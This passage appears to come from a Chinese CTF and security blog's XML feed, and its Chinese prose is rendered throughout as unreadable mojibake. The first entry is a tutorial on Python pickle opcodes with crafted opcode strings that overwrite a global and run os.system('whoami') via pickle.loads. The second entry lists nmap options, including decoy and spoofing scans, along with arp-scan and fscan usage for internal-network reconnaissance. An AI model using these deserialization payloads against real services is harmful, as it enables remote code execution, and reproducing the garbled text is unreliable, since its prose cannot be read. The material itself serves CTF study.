ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œä»¥è¯¥å…ƒç»„ä¸ºå‚æ•°æ‰§è¡Œå…¨å±€å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</td><td>i[module]\n[callable]\n</td><td>è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ</td><td>æ— </td></tr><tr><td>N</td><td>å®ä¾‹åŒ–ä¸€ä¸ªNone</td><td>N</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>S</td><td>å®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡</td><td>Sâ€™xxxâ€™\nï¼ˆä¹Ÿå¯ä»¥ä½¿ç”¨åŒå¼•å·ã€&#39;ç­‰pythonå­—ç¬¦ä¸²å½¢å¼ï¼‰</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>V</td><td>å®ä¾‹åŒ–ä¸€ä¸ªUNICODEå­—ç¬¦ä¸²å¯¹è±¡</td><td>Vxxx\n</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>I</td><td>å®ä¾‹åŒ–ä¸€ä¸ªintå¯¹è±¡</td><td>Ixxx\n</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>F</td><td>å®ä¾‹åŒ–ä¸€ä¸ªfloatå¯¹è±¡</td><td>Fx.x\n</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>R</td><td>é€‰æ‹©æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ã€ç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆç¬¬äºŒä¸ªå¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°</td><td>R</td><td>å‡½æ•°å’Œå‚æ•°å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼å…¥æ ˆ</td><td>æ— </td></tr><tr><td>.</td><td>ç¨‹åºç»“æŸï¼Œæ ˆé¡¶çš„ä¸€ä¸ªå…ƒç´ ä½œä¸ºpickle.loads()çš„è¿”å›å€¼</td><td>.</td><td>æ— </td><td>æ— </td></tr><tr><td>(</td><td>å‘æ ˆä¸­å‹å…¥ä¸€ä¸ªMARKæ ‡è®°</td><td>(</td><td>MARKæ ‡è®°å…¥æ ˆ</td><td>æ— </td></tr><tr><td>t</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„</td><td>t</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>)</td><td>å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå…ƒç»„</td><td>)</td><td>ç©ºå…ƒç»„å…¥æ ˆ</td><td>æ— </td></tr><tr><td>l</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºåˆ—è¡¨</td><td>l</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>]</td><td>å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºåˆ—è¡¨</td><td>]</td><td>ç©ºåˆ—è¡¨å…¥æ ˆ</td><td>æ— </td></tr><tr><td>d</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå­—å…¸ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰</td><td>d</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>}</td><td>å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå­—å…¸</td><td>}</td><td>ç©ºå­—å…¸å…¥æ ˆ</td><td>æ— </td></tr><tr><td>p</td><td>å°†æ ˆé¡¶å¯¹è±¡å‚¨å­˜è‡³memo_n</td><td>pn\n</td><td>æ— </td><td>å¯¹è±¡è¢«å‚¨å­˜</td></tr><tr><td>g</td><td>å°†memo_nçš„å¯¹è±¡å‹æ ˆ</td><td>gn\n</td><td>å¯¹è±¡è¢«å‹æ ˆ</td><td>æ— </td></tr><tr><td>0</td><td>ä¸¢å¼ƒæ ˆé¡¶å¯¹è±¡</td><td>0</td><td>æ ˆé¡¶å¯¹è±¡è¢«ä¸¢å¼ƒ</td><td>æ— </td></tr><tr><td>b</td><td>ä½¿ç”¨æ ˆä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå‚¨å­˜å¤šä¸ªå±æ€§å: å±æ€§å€¼çš„å­—å…¸ï¼‰å¯¹ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå¯¹è±¡å®ä¾‹ï¼‰è¿›è¡Œå±æ€§è®¾ç½®</td><td>b</td><td>æ ˆä¸Šç¬¬ä¸€ä¸ªå…ƒç´ å‡ºæ ˆ</td><td>æ— </td></tr><tr><td>s</td><td>å°†æ ˆçš„ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºkey-valueå¯¹ï¼Œæ·»åŠ æˆ–æ›´æ–°åˆ°æ ˆçš„ç¬¬ä¸‰ä¸ªå¯¹è±¡ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨æˆ–å­—å…¸ï¼Œåˆ—è¡¨ä»¥æ•°å­—ä½œä¸ºkeyï¼‰ä¸­</td><td>s</td><td>ç¬¬ä¸€ã€äºŒä¸ªå…ƒç´ å‡ºæ ˆï¼Œç¬¬ä¸‰ä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨æˆ–å­—å…¸ï¼‰æ·»åŠ æ–°å€¼æˆ–è¢«æ›´æ–°</td><td>æ— </td></tr><tr><td>u</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰å¹¶å…¨éƒ¨æ·»åŠ æˆ–æ›´æ–°åˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºå­—å…¸ï¼‰ä¸­</td><td>u</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œå­—å…¸è¢«æ›´æ–°</td><td>æ— </td></tr><tr><td>a</td><td>å°†æ ˆçš„ç¬¬ä¸€ä¸ªå…ƒç´ appendåˆ°ç¬¬äºŒä¸ªå…ƒç´ (åˆ—è¡¨)ä¸­</td><td>a</td><td>æ ˆé¡¶å…ƒç´ å‡ºæ ˆï¼Œç¬¬äºŒä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨ï¼‰è¢«æ›´æ–°</td><td>æ— </td></tr><tr><td>e</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®å¹¶extendsåˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨ï¼‰ä¸­</td><td>e</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œåˆ—è¡¨è¢«æ›´æ–°</td><td>æ— </td></tr></tbody></table><p><strong>å…¨å±€å˜é‡è¦†ç›–</strong></p><p>æœ‰æ—¶å€™æˆ‘ä»¬æƒ³è¦ä¿®æ”¹ä¸€äº›å…¨å±€å˜é‡çš„å€¼å°±å¯ä»¥ç¼–å†™opcodeï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>:<br>    name=<span class="hljs-string">&quot;flag&#123;fake&#125;&quot;</span><br>secret=test()<br>opcode=<span class="hljs-string">&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;name&#x27;</span><br><span class="hljs-string">S&#x27;flag&#123;true&#125;&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;before:&#x27;</span>+secret.name)<br>output=pickle.loads(opcode.encode())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;output:&#x27;</span>,output)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;after:&#x27;</span>+secret.name)<br></code></pre></td></tr></table></figure><p>ç»“æœï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">before:flag&#123;fake&#125;<br>output: &lt;__main__.test object at 0x000001F6F7395648&gt;<br>after:flag&#123;true&#125;<br></code></pre></td></tr></table></figure><p><strong>å‡½æ•°æ‰§è¡Œ</strong></p><p>ä¸å‡½æ•°æ‰§è¡Œç›¸å…³çš„opcodeæœ‰ä¸‰ä¸ªï¼š <code>R</code> ã€ <code>i</code> ã€ <code>o</code> ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä»ä¸‰ä¸ªæ–¹å‘è¿›è¡Œæ„é€ ï¼š</p><ul><li><p>Rï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">import pickle<br>opcode=b&#x27;&#x27;&#x27;cos<br>system<br>(S&#x27;whoami&#x27;<br>tR.&#x27;&#x27;&#x27;<br>pickle.loads(opcode)<br></code></pre></td></tr></table></figure></li><li><p>iï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br>pickle.loads(opcode)<br></code></pre></td></tr></table></figure></li><li><p>oï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">S&#x27;whoami&#x27;</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br>pickle.loads(opcode)<br></code></pre></td></tr></table></figure></li></ul><p><strong>å®ä¾‹åŒ–å¯¹è±¡</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        self.name = name<br>        self.age = age<br><br>data=<span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">Student</span><br><span class="hljs-string">(S&#x27;XiaoMing&#x27;</span><br><span class="hljs-string">S&quot;20&quot;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br><br>a=pickle.loads(data)<br><span class="hljs-built_in">print</span>(a.name,a.age)<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…ç½‘ä¿¡æ¯æœé›†å¸¸ç”¨å·¥å…·</title>
      <link href="/2024/04/11/%E5%86%85%E7%BD%91%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/04/11/%E5%86%85%E7%BD%91%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://cloud.tencent.com/developer/article/1933509">https://cloud.tencent.com/developer/article/1933509</a></p><p>å‚è€ƒæ‰‹å†Œï¼š<a href="https://wizardforcel.gitbooks.io/nmap-man-page/content/index.html">https://wizardforcel.gitbooks.io/nmap-man-page/content/index.html</a></p><p>Nmapç”¨äºåˆ—ä¸¾ç½‘ç»œä¸»æœºæ¸…å•ã€ç®¡ç†æœåŠ¡å‡çº§è°ƒåº¦ã€ç›‘æ§ä¸»æœºæˆ–æœåŠ¡è¿è¡ŒçŠ¶å†µã€‚Nmapå¯ä»¥æ£€æµ‹ç›®æ ‡æœºæ˜¯å¦åœ¨çº¿ã€ç«¯å£å¼€æ”¾æƒ…å†µã€ä¾¦æµ‹è¿è¡Œçš„æœåŠ¡ç±»å‹åŠç‰ˆæœ¬ä¿¡æ¯ã€ä¾¦æµ‹æ“ä½œç³»ç»Ÿä¸è®¾å¤‡ç±»å‹ç­‰ä¿¡æ¯ã€‚</p><p>NmapåŒ…å«å››é¡¹åŸºæœ¬åŠŸèƒ½ï¼š</p><ul><li>ä¸»æœºå‘ç° (Host Discovery)</li><li>ç«¯å£æ‰«æ (Port Scanning)</li><li>ç‰ˆæœ¬ä¾¦æµ‹ (Version Detection)</li><li>æ“ä½œç³»ç»Ÿä¾¦æµ‹ (Operating System Detection)</li></ul><p>copyä¸€ä¸‹ä¸€äº›nmapçš„å‚æ•°è¿‡æ¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">nmap â€“iflist : æŸ¥çœ‹æœ¬åœ°ä¸»æœºçš„æ¥å£ä¿¡æ¯å’Œè·¯ç”±ä¿¡æ¯<br>-A ï¼šé€‰é¡¹ç”¨äºä½¿ç”¨è¿›æ”»æ€§æ–¹å¼æ‰«æ<br>-T4ï¼š æŒ‡å®šæ‰«æè¿‡ç¨‹ä½¿ç”¨çš„æ—¶åºï¼Œæ€»æœ‰6ä¸ªçº§åˆ«ï¼ˆ0-5ï¼‰ï¼Œçº§åˆ«è¶Šé«˜ï¼Œæ‰«æé€Ÿåº¦è¶Šå¿«ï¼Œä½†ä¹Ÿå®¹æ˜“è¢«é˜²ç«å¢™æˆ–IDSæ£€æµ‹å¹¶å±è”½æ‰ï¼Œåœ¨ç½‘ç»œé€šè®¯çŠ¶å†µè¾ƒå¥½çš„æƒ…å†µä¸‹æ¨èä½¿ç”¨T4<br>-oX test.xmlï¼š å°†æ‰«æç»“æœç”Ÿæˆ test.xml æ–‡ä»¶ï¼Œå¦‚æœä¸­æ–­ï¼Œåˆ™ç»“æœæ‰“ä¸å¼€<br>-oA test.xml:  å°†æ‰«æç»“æœç”Ÿæˆ test.xml æ–‡ä»¶ï¼Œä¸­æ–­åï¼Œç»“æœä¹Ÿå¯ä¿å­˜<br>-oG test.txt:  å°†æ‰«æç»“æœç”Ÿæˆ test.txt æ–‡ä»¶<br>-sn : åªè¿›è¡Œä¸»æœºå‘ç°ï¼Œä¸è¿›è¡Œç«¯å£æ‰«æ<br>-O : æŒ‡å®šNmapè¿›è¡Œç³»ç»Ÿç‰ˆæœ¬æ‰«æ<br>-sV: æŒ‡å®šè®©Nmapè¿›è¡ŒæœåŠ¡ç‰ˆæœ¬æ‰«æ<br>-p &lt;port ranges&gt;: æ‰«ææŒ‡å®šçš„ç«¯å£<br>-sS/sT/sA/sW/sM:æŒ‡å®šä½¿ç”¨ TCP SYN/Connect()/ACK/Window/Maimon scansçš„æ–¹å¼æ¥å¯¹ç›®æ ‡ä¸»æœºè¿›è¡Œæ‰«æ<br>-sU: æŒ‡å®šä½¿ç”¨UDPæ‰«ææ–¹å¼ç¡®å®šç›®æ ‡ä¸»æœºçš„UDPç«¯å£çŠ¶å†µ<br>-script &lt;script name&gt; : æŒ‡å®šæ‰«æè„šæœ¬<br>-Pn ï¼š ä¸è¿›è¡Œpingæ‰«æ<br>-sP :  ç”¨pingæ‰«æåˆ¤æ–­ä¸»æœºæ˜¯å¦å­˜æ´»ï¼Œåªæœ‰ä¸»æœºå­˜æ´»ï¼Œnmapæ‰ä¼šç»§ç»­æ‰«æï¼Œä¸€èˆ¬æœ€å¥½ä¸åŠ ï¼Œå› ä¸ºæœ‰çš„ä¸»æœºä¼šç¦æ­¢ping<br>-PI :  è®¾ç½®è¿™ä¸ªé€‰é¡¹ï¼Œè®©nmapä½¿ç”¨çœŸæ­£çš„ping(ICMP echoè¯·æ±‚)æ¥æ‰«æç›®æ ‡ä¸»æœºæ˜¯å¦æ­£åœ¨è¿è¡Œã€‚<br>-iL 1.txt : æ‰¹é‡æ‰«æ1.txtä¸­çš„ç›®æ ‡åœ°å€<br> <br>-sL: List Scan åˆ—è¡¨æ‰«æï¼Œä»…å°†æŒ‡å®šçš„ç›®æ ‡çš„IPåˆ—ä¸¾å‡ºæ¥ï¼Œä¸è¿›è¡Œä¸»æœºå‘ç°<br>-sY/sZ: ä½¿ç”¨SCTP INIT/COOKIE-ECHOæ¥æ‰«æSCTPåè®®ç«¯å£çš„å¼€æ”¾çš„æƒ…å†µ<br>-sO: ä½¿ç”¨IP protocol æ‰«æç¡®å®šç›®æ ‡æœºæ”¯æŒçš„åè®®ç±»å‹<br>-PO : ä½¿ç”¨IPåè®®åŒ…æ¢æµ‹å¯¹æ–¹ä¸»æœºæ˜¯å¦å¼€å¯ <br>-PE/PP/PM : ä½¿ç”¨ICMP echoã€ ICMP timestampã€ICMP netmask è¯·æ±‚åŒ…å‘ç°ä¸»æœº<br>-PS/PA/PU/PY : ä½¿ç”¨TCP SYN/TCP ACKæˆ–SCTP INIT/ECHOæ–¹å¼è¿›è¡Œå‘ç°<br>-sN/sF/sX: æŒ‡å®šä½¿ç”¨TCP Null, FIN, and Xmas scansç§˜å¯†æ‰«ææ–¹å¼æ¥ååŠ©æ¢æµ‹å¯¹æ–¹çš„TCPç«¯å£çŠ¶æ€<br>-e eth0ï¼šæŒ‡å®šä½¿ç”¨eth0ç½‘å¡è¿›è¡Œæ¢æµ‹<br>-f : --mtu &lt;val&gt;: æŒ‡å®šä½¿ç”¨åˆ†ç‰‡ã€æŒ‡å®šæ•°æ®åŒ…çš„ MTU.<br>-b &lt;FTP relay host&gt;: ä½¿ç”¨FTP bounce scanæ‰«ææ–¹å¼<br>-gï¼š æŒ‡å®šå‘é€çš„ç«¯å£å·<br>-r: ä¸è¿›è¡Œç«¯å£éšæœºæ‰“ä¹±çš„æ“ä½œï¼ˆå¦‚æ— è¯¥å‚æ•°ï¼Œnmapä¼šå°†è¦æ‰«æçš„ç«¯å£ä»¥éšæœºé¡ºåºæ–¹å¼æ‰«æï¼Œä»¥è®©nmapçš„æ‰«æä¸æ˜“è¢«å¯¹æ–¹é˜²ç«å¢™æ£€æµ‹åˆ°ï¼‰<br>-v è¡¨ç¤ºæ˜¾ç¤ºå†—ä½™ä¿¡æ¯ï¼Œåœ¨æ‰«æè¿‡ç¨‹ä¸­æ˜¾ç¤ºæ‰«æçš„ç»†èŠ‚ï¼Œä»è€Œè®©ç”¨æˆ·äº†è§£å½“å‰çš„æ‰«æçŠ¶æ€<br>-n : è¡¨ç¤ºä¸è¿›è¡ŒDNSè§£æï¼›<br>-D  &lt;decoy1,decoy2[,ME],...&gt;: ç”¨ä¸€ç»„ IP åœ°å€æ©ç›–çœŸå®åœ°å€ï¼Œå…¶ä¸­ ME å¡«å…¥è‡ªå·±çš„ IP åœ°å€<br>-R ï¼šè¡¨ç¤ºæ€»æ˜¯è¿›è¡ŒDNSè§£æã€‚ <br>-F : å¿«é€Ÿæ¨¡å¼ï¼Œä»…æ‰«æTOP 100çš„ç«¯å£ <br>-S &lt;IP_Address&gt;: ä¼ªè£…æˆå…¶ä»– IP åœ°å€<br>--ttl &lt;val&gt;: è®¾ç½® time-to-live æ—¶é—´<br>--badsum: ä½¿ç”¨é”™è¯¯çš„ checksum æ¥å‘é€æ•°æ®åŒ…ï¼ˆæ­£å¸¸æƒ…å†µä¸‹ï¼Œè¯¥ç±»æ•°æ®åŒ…è¢«æŠ›å¼ƒï¼Œå¦‚æœæ”¶åˆ°å›å¤ï¼Œè¯´æ˜å›å¤æ¥è‡ªé˜²ç«å¢™æˆ– IDS/IPSï¼‰<br>--dns-servers  : æŒ‡å®šDNSæœåŠ¡å™¨<br>--system-dns : æŒ‡å®šä½¿ç”¨ç³»ç»Ÿçš„DNSæœåŠ¡å™¨   <br>--traceroute : è¿½è¸ªæ¯ä¸ªè·¯ç”±èŠ‚ç‚¹ <br>--scanflags &lt;flags&gt;: å®šåˆ¶TCPåŒ…çš„flags<br>--top-ports &lt;number&gt; :æ‰«æå¼€æ”¾æ¦‚ç‡æœ€é«˜çš„numberä¸ªç«¯å£<br>--port-ratio &lt;ratio&gt;: æ‰«ææŒ‡å®šé¢‘ç‡ä»¥ä¸Šçš„ç«¯å£ã€‚ä¸ä¸Šè¿°--top-portsç±»ä¼¼ï¼Œè¿™é‡Œä»¥æ¦‚ç‡ä½œä¸ºå‚æ•°<br>--version-trace: æ˜¾ç¤ºå‡ºè¯¦ç»†çš„ç‰ˆæœ¬ä¾¦æµ‹è¿‡ç¨‹ä¿¡æ¯<br>--osscan-limit: é™åˆ¶Nmapåªå¯¹ç¡®å®šçš„ä¸»æœºçš„è¿›è¡ŒOSæ¢æµ‹ï¼ˆè‡³å°‘éœ€ç¡®çŸ¥è¯¥ä¸»æœºåˆ†åˆ«æœ‰ä¸€ä¸ªopenå’Œclosedçš„ç«¯å£ï¼‰<br>--osscan-guess: å¤§èƒ†çŒœæµ‹å¯¹æ–¹çš„ä¸»æœºçš„ç³»ç»Ÿç±»å‹ã€‚ç”±æ­¤å‡†ç¡®æ€§ä¼šä¸‹é™ä¸å°‘ï¼Œä½†ä¼šå°½å¯èƒ½å¤šä¸ºç”¨æˆ·æä¾›æ½œåœ¨çš„æ“ä½œç³»ç»Ÿ<br>--data-length &lt;num&gt;: å¡«å……éšæœºæ•°æ®è®©æ•°æ®åŒ…é•¿åº¦è¾¾åˆ° Num<br>--ip-options &lt;options&gt;: ä½¿ç”¨æŒ‡å®šçš„ IP é€‰é¡¹æ¥å‘é€æ•°æ®åŒ…<br>--spoof-mac &lt;mac address/prefix/vendor name&gt; : ä¼ªè£… MAC åœ°å€<br>--version-intensity &lt;level&gt;: æŒ‡å®šç‰ˆæœ¬ä¾¦æµ‹å¼ºåº¦ï¼ˆ0-9ï¼‰ï¼Œé»˜è®¤ä¸º7ã€‚æ•°å€¼è¶Šé«˜ï¼Œæ¢æµ‹å‡ºçš„æœåŠ¡è¶Šå‡†ç¡®ï¼Œä½†æ˜¯è¿è¡Œæ—¶é—´ä¼šæ¯”è¾ƒé•¿ã€‚<br>--version-light: æŒ‡å®šä½¿ç”¨è½»é‡ä¾¦æµ‹æ–¹å¼ (intensity 2)<br>--version-all: å°è¯•ä½¿ç”¨æ‰€æœ‰çš„probesè¿›è¡Œä¾¦æµ‹ (intensity 9)<br>--version-trace: æ˜¾ç¤ºå‡ºè¯¦ç»†çš„ç‰ˆæœ¬ä¾¦æµ‹è¿‡ç¨‹ä¿¡æ¯<br>nmap 192.168.1.0/24 -exclude 192.168.1.10  #æ‰«æé™¤192.168.1.0å¤–çš„è¯¥ç½‘æ®µçš„å…¶ä»–åœ°å€<br>nmap 192.168.1.0/24 -excludefile f:/1.txt  #æ‰«æé™¤ç»™å®šæ–‡ä»¶ä¸­çš„åœ°å€ä»¥å¤–çš„å…¶ä»–åœ°å€<br>nmap -sF -T4 192.168.1.0 #æ¢æµ‹é˜²ç«å¢™çŠ¶æ€<br></code></pre></td></tr></table></figure><p>æ›´è¯¦ç»†çš„å°±å»çœ‹æ‰‹å†Œå­¦ä¹ äº†ï¼Œè¿™é‡Œå°±ä¸è®°å½•äº†ã€‚</p><h1 id="arp-scan"><a href="#Arp-scan" class="headerlink" title="Arp-scan"></a>Arp-scan</h1><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.royhills.co.uk/wiki/index.php/Arp-scan_option_summary%EF%BC%8Chttps://blog.csdn.net/liver100day/article/details/117560828">https://www.royhills.co.uk/wiki/index.php/Arp-scan_option_summaryï¼Œhttps://blog.csdn.net/liver100day/article/details/117560828</a></p><p>arp-scanæ˜¯Kali Linuxè‡ªå¸¦çš„ä¸€æ¬¾ARPæ‰«æå·¥å…·ã€‚è¯¥å·¥å…·å¯ä»¥è¿›è¡Œå•ä¸€ç›®æ ‡æ‰«æï¼Œä¹Ÿå¯ä»¥è¿›è¡Œæ‰¹é‡æ‰«æã€‚æ‰¹é‡æ‰«æçš„æ—¶å€™ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡CIDR<br>åœ°å€èŒƒå›´æˆ–è€…åˆ—è¡¨æ–‡ä»¶çš„æ–¹å¼æŒ‡å®šã€‚è¯¥å·¥å…·å…è®¸ç”¨æˆ·å®šåˆ¶ARPåŒ…ï¼Œæ„å»ºéæ ‡å‡†æ•°æ®åŒ…ã€‚åŒæ—¶ï¼Œè¯¥å·¥å…·ä¼šè‡ªåŠ¨è§£æMacåœ°å€ï¼Œç»™å‡ºMACå¯¹åº”çš„ç¡¬<br>ä»¶å‚å•†ï¼Œå¸®åŠ©ç”¨æˆ·ç¡®è®¤ç›®æ ‡ã€‚</p><p>è¿™é‡Œcopyä¸€ä¸‹å¸¸ç”¨æŒ‡ä»¤ï¼š</p><table><thead><tr><th>å‚æ•°å</th><th>å‚æ•°å«ä¹‰</th><th>ä½¿ç”¨ç¤ºä¾‹</th></tr></thead><tbody><tr><td>-f</td><td>ä»æŒ‡å®šæ–‡ä»¶ä¸­è¯»å–ä¸»æœºåæˆ–åœ°å€</td><td>arp-scan -f ip.txt</td></tr><tr><td>-l</td><td>ä»ç½‘ç»œæ¥å£é…ç½®ç”Ÿæˆåœ°å€</td><td>arp-scan -l</td></tr><tr><td>-i</td><td>å„æ‰«æä¹‹é—´çš„æ—¶é—´å·®</td><td>arp-scan -l -i 1000</td></tr><tr><td>-r</td><td>æ¯ä¸ªä¸»æœºæ‰«ææ¬¡æ•°</td><td>arp-scan -l -r 5</td></tr><tr><td>-V</td><td>æ˜¾ç¤ºç¨‹åºç‰ˆæœ¬å¹¶é€€å‡º</td><td>arp-scan -l -V</td></tr><tr><td>-t</td><td>è®¾ç½®ä¸»æœºè¶…æ—¶æ—¶é—´</td><td>arp-scan -t 1000 192.168.75.0&#x2F;24</td></tr><tr><td>-L</td><td>ä½¿ç”¨ç½‘ç»œæ¥å£</td><td>arp-scan -L eth0</td></tr><tr><td>-g</td><td>ä¸æ˜¾ç¤ºé‡å¤çš„æ•°æ®</td><td>arp-scan -l -g</td></tr><tr><td>-D</td><td>æ˜¾ç¤ºæ•°æ®åŒ…å¾€è¿”æ—¶é—´</td><td>arp-scan -l -D</td></tr></tbody></table><h1 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h1><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://cloud.tencent.com/developer/article/1821061">https://cloud.tencent.com/developer/article/1821061</a></p><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><p>fscan æ˜¯ä¸€ä¸ªå†…ç½‘ç»¼åˆæ‰«æå·¥å…·ï¼Œæ–¹ä¾¿ä¸€é”®è‡ªåŠ¨åŒ–ã€å…¨æ–¹ä½æ¼æ´æ‰«æå·¥å…·ã€‚</p><p>å®ƒæ”¯æŒä¸»æœºå­˜æ´»æ¢æµ‹ã€ç«¯å£æ‰«æã€å¸¸è§æœåŠ¡çš„çˆ†ç ´ã€ms17010ã€redisæ‰¹é‡å†™å…¬é’¥ã€è®¡åˆ’ä»»åŠ¡åå¼¹shellã€è¯»å–winç½‘å¡ä¿¡æ¯ã€webæŒ‡çº¹è¯†åˆ«ã€webæ¼æ´æ‰«æã€netbiosæ¢æµ‹ã€åŸŸæ§è¯†åˆ«ç­‰åŠŸèƒ½ã€‚</p><p><strong>kaliå®‰è£…</strong></p><p>è¦åœ¨1.8.2çš„ç‰ˆæœ¬æ‰æœ‰Linuxçš„</p><p><img src="http://cdn.clown2024.cn/202407151445874.png" alt="image-20240419191321892"></p><p>ä¸‹è½½ä¹‹åç›´æ¥â€.&#x2F;fscan_amd64â€å³å¯</p><p><strong>ç®€å•ç”¨æ³•</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">fscan.exe -h 192.168.1.1/24  (é»˜è®¤ä½¿ç”¨å…¨éƒ¨æ¨¡å—)<br>fscan.exe -h 192.168.1.1/16  